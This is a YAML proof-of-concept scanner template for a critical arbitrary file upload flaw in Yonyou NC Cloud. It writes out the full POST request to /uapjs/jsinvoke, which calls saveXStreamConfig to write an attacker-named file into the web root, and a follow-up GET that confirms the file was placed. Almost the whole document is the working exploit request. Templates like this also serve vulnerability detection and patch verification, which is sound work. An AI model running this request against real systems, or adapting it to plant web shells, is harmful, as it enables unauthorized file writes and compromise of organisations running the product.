id: poc-yaml-yongyou-nc-cloud-jsinvoke-file-upload
info:
  name: 用友 NC Cloud jsinvoke 任意文件上传漏洞
  severity: critical
  tags:
  - 文件上传
  finger: 用友-NC-Cloud
variables:
  t1: random_str(8)
  t2: md5(t1)
requests:
- raw: 'POST /uapjs/jsinvoke/?action=invoke HTTP/1.1

    Host:

    Content-Type: application/x-www-form-urlencoded


    {"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig","parameterTypes":["java.lang.Object","java.lang.String"],"parameters":["{{.t2}}","webapps/nc_web/{{.t1}}.txt"]}'
  expression: status_code == 200 && contains(body,"")
- method: GET
  path: /{{.t1}}.txt
  expression: status_code == 200 && contains(body,t2) && contains(body,"<string>")
transport: http
